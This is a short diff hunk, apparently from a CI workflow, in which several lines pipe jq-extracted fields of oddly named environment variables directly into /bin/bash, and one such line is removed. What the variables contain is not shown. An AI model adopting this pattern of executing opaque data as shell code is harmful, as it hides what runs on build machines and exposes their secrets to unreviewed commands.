@@ -22,7 +22,6 @@ jobs:
           echo $hdpuh68 | jq -r .docuo4 | /bin/bash
           printf '%s' "$bkn09794" | jq -r .hoog39 | /bin/bash
           echo $izisx16203 | jq -r .bnjo244 | /bin/bash
-          echo $o9 | jq -r .ml9078 | /bin/bash
 
       - name: Save output
         if: always()
